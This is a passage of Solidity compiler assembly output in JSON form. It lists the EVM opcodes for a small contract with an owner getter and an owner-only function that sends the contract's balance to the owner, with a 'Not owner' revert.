											"value": "0"
										},
										{
											"begin": 0,
											"end": 397,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 0,
											"end": 397,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 0,
											"end": 397,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 0,
											"end": 397,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 0,
											"end": 397,
											"name": "PUSH",
											"source": 0,
											"value": "8DA5CB5B"
										},
										{
											"begin": 0,
											"end": 397,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 0,
											"end": 397,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 0,
											"end": 397,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 0,
											"end": 397,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 0,
											"end": 397,
											"name": "PUSH",
											"source": 0,
											"value": "9890220B"
										},
										{
											"begin": 0,
											"end": 397,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 0,
											"end": 397,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 0,
											"end": 397,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 0,
											"end": 397,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 0,
											"end": 397,
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 0,
											"end": 397,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 0,
											"end": 397,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 0,
											"end": 397,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 0,
											"end": 397,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 0,
											"end": 397,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 0,
											"end": 397,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 0,
											"end": 397,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 0,
											"end": 397,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 0,
											"end": 397,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 0,
											"end": 397,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 0,
											"end": 397,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 31,
											"end": 51,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 31,
											"end": 51,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 31,
											"end": 51,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 31,
											"end": 51,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "tag",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 31,
											"end": 51,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 31,
											"end": 51,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 31,
											"end": 51,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "tag",
											"source": 0,
											"value": "8"
										},
										{
											"begin": 31,
											"end": 51,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 31,
											"end": 51,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 31,
											"end": 51,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "11"
										},
										{
											"begin": 31,
											"end": 51,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "tag",
											"source": 0,
											"value": "10"
										},
										{
											"begin": 31,
											"end": 51,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 31,
											"end": 51,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 220,
											"end": 360,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 220,
											"end": 360,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 220,
											"end": 360,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 220,
											"end": 360,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 220,
											"end": 360,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 220,
											"end": 360,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 220,
											"end": 360,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 220,
											"end": 360,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 220,
											"end": 360,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 220,
											"end": 360,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 220,
											"end": 360,
											"name": "tag",
											"source": 0,
											"value": "12"
										},
										{
											"begin": 220,
											"end": 360,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 220,
											"end": 360,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 220,
											"end": 360,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 220,
											"end": 360,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 220,
											"end": 360,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 220,
											"end": 360,
											"name": "tag",
											"source": 0,
											"value": "13"
										},
										{
											"begin": 220,
											"end": 360,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 220,
											"end": 360,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "tag",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 31,
											"end": 51,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 31,
											"end": 51,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 31,
											"end": 51,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 31,
											"end": 51,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 31,
											"end": 51,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 31,
											"end": 51,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 220,
											"end": 360,
											"name": "tag",
											"source": 0,
											"value": "14"
										},
										{
											"begin": 220,
											"end": 360,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 278,
											"end": 283,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 278,
											"end": 283,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 278,
											"end": 283,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 278,
											"end": 283,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 278,
											"end": 283,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 278,
											"end": 283,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 278,
											"end": 283,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 278,
											"end": 283,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 278,
											"end": 283,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 278,
											"end": 283,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 278,
											"end": 283,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 264,
											"end": 283,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 264,
											"end": 283,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 264,
											"end": 274,
											"name": "CALLER",
											"source": 0
										},
										{
											"begin": 264,
											"end": 283,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 264,
											"end": 283,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 264,
											"end": 283,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 256,
											"end": 297,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 256,
											"end": 297,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 256,
											"end": 297,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 256,
											"end": 297,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 256,
											"end": 297,
											"name": "PUSH",
											"source": 0,
											"value": "8C379A000000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 256,
											"end": 297,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 256,
											"end": 297,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 256,
											"end": 297,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 256,
											"end": 297,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 256,
											"end": 297,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 256,
											"end": 297,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 256,
											"end": 297,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "18"
										},
										{
											"begin": 256,
											"end": 297,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 256,
											"end": 297,
											"name": "tag",
											"source": 0,
											"value": "17"
										},
										{
											"begin": 256,
											"end": 297,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 256,
											"end": 297,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 256,
											"end": 297,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 256,
											"end": 297,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 256,
											"end": 297,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 256,
											"end": 297,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 256,
											"end": 297,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 256,
											"end": 297,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 256,
											"end": 297,
											"name": "tag",
											"source": 0,
											"value": "16"
										},
										{
											"begin": 256,
											"end": 297,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 315,
											"end": 320,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 315,
											"end": 320,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 315,
											"end": 320,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 315,
											"end": 320,
											"name": "SLOAD",
											"source": 0
										},
										{
											"begin": 315,
											"end": 320,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 315,
											"end": 320,
											"name": "PUSH",
											"source": 0,
											"value": "100"
										},
										{
											"begin": 315,
											"end": 320,
											"name": "EXP",
											"source": 0
										},
										{
											"begin": 315,
											"end": 320,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 315,
											"end": 320,
											"name": "DIV",
											"source": 0
										},
										{
											"begin": 315,
											"end": 320,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 315,
											"end": 320,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 307,
											"end": 330,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 307,
											"end": 330,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "PUSH",
											"source": 0,
											"value": "8FC"
										},
										{
											"begin": 331,
											"end": 352,
											"name": "SELFBALANCE",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "MUL",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 307,
											"end": 353,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 307,
											"end": 353,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 307,
											"end": 353,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "DUP4",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "DUP6",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "DUP9",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "CALL",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "SWAP4",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 307,
											"end": 353,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 307,
											"end": 353,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 307,
											"end": 353,
											"name": "RETURNDATACOPY",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "RETURNDATASIZE",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 307,
											"end": 353,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "tag",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 307,
											"end": 353,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 307,
											"end": 353,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 220,
											"end": 360,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 0
										},
										{
											"begin": 7,
											"end": 133,
											"name": "tag",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 7,
											"end": 133,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 44,
											"end": 51,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 84,
											"end": 126,
											"name": "PUSH",
											"source": 1,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 77,
											"end": 82,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 73,
											"end": 127,
											"name": "AND",
											"source": 1
										},
										{
											"begin": 62,
											"end": 127,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 62,
											"end": 127,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 133,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "tag",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 139,
											"end": 235,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 176,
											"end": 183,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 205,
											"end": 229,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 223,
											"end": 228,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 205,
											"end": 229,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "21"
										},
										{
											"begin": 205,
											"end": 229,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 205,
											"end": 229,
											"name": "tag",
											"source": 1,
											"value": "30"
										},
										{
											"begin": 205,
											"end": 229,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 194,
											"end": 229,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 194,
											"end": 229,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 139,
											"end": 235,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"name": "tag",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 241,
											"end": 359,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 328,
											"end": 352,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 346,
											"end": 351,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 328,
											"end": 352,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "22"
										},
										{
											"begin": 328,
											"end": 352,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 328,
											"end": 352,
											"name": "tag",
											"source": 1,
											"value": "32"
										},
										{
											"begin": 328,
											"end": 352,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 323,
											"end": 326,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 316,
											"end": 353,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 241,
											"end": 359,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "tag",
											"source": 1,
											"value": "11"
										},
										{
											"begin": 365,
											"end": 587,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 458,
											"end": 462,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 496,
											"end": 498,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 485,
											"end": 494,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 481,
											"end": 499,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 473,
											"end": 499,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 473,
											"end": 499,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 509,
											"end": 580,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 577,
											"end": 578,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 566,
											"end": 575,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 562,
											"end": 579,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 553,
											"end": 559,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 509,
											"end": 580,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "23"
										},
										{
											"begin": 509,
											"end": 580,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 509,
											"end": 580,
											"name": "tag",
											"source": 1,
											"value": "34"
										},
										{
											"begin": 509,
											"end": 580,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 365,
											"end": 587,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 593,
											"end": 762,
											"name": "tag",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 593,
											"end": 762,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 677,
											"end": 688,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 711,
											"end": 717,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 706,
											"end": 709,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 699,
											"end": 718,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 751,
											"end": 755,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 746,
											"end": 749,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 742,
											"end": 756,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 727,
											"end": 756,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 727,
											"end": 756,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 593,
											"end": 762,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 593,
											"end": 762,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 593,
											"end": 762,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 593,
											"end": 762,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 593,
											"end": 762,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 768,
											"end": 927,
											"name": "tag",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 768,
											"end": 927,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 908,
											"end": 919,
											"name": "PUSH",
											"source": 1,
											"value": "4E6F74206F776E65720000000000000000000000000000000000000000000000"
										},
										{
											"begin": 904,
											"end": 905,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 896,
											"end": 902,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 892,
											"end": 906,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 885,
											"end": 920,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 768,
											"end": 927,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 768,
											"end": 927,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 933,
											"end": 1298,
											"name": "tag",
											"source": 1,
											"value": "26"
										},
										{
											"begin": 933,
											"end": 1298,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1075,
											"end": 1078,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1096,
											"end": 1162,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 1160,
											"end": 1161,
											"name": "PUSH",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 1155,
											"end": 1158,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1096,
											"end": 1162,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "24"
										},
										{
											"begin": 1096,
											"end": 1162,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1096,
											"end": 1162,
											"name": "tag",
											"source": 1,
											"value": "38"
										},
										{
											"begin": 1096,
											"end": 1162,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1089,
											"end": 1162,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 1089,
											"end": 1162,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1171,
											"end": 1264,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 1260,
											"end": 1263,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1171,
											"end": 1264,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "25"
										},
										{
											"begin": 1171,
											"end": 1264,
											"jumpType": "[in]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1171,
											"end": 1264,
											"name": "tag",
											"source": 1,
											"value": "39"
										},
										{
											"begin": 1171,
											"end": 1264,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1289,
											"end": 1291,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1284,
											"end": 1287,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1280,
											"end": 1292,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1273,
											"end": 1292,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1273,
											"end": 1292,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 933,
											"end": 1298,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 933,
											"end": 1298,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 933,
											"end": 1298,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 933,
											"end": 1298,
											"jumpType": "[out]",
											"name": "JUMP",
											"source": 1
										},
										{
											"begin": 1304,
											"end": 1723,
											"name": "tag",
											"source": 1,
											"value": "18"
										},
										{
											"begin": 1304,
											"end": 1723,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 1470,
											"end": 1474,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1508,
											"end": 1510,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 1497,
											"end": 1506,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 1493,
											"end": 1511,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1485,
											"end": 1511,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 1485,
											"end": 1511,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 1557,
											"end": 1566,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1551,
											"end": 1555,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1547,
											"end": 1567,
											"name": "SUB",
											"source": 1
										},
										{
											"begin": 1543,
											"end": 1544,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 1532,
											"end": 1541,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 1528,
											"end": 1545,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 1521,
											"end": 1568,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 1585,
											"end": 1716,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "41"
										},
										{
											"begin": 1711,
											"end": 1715,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 1585,
											"end": 1716,
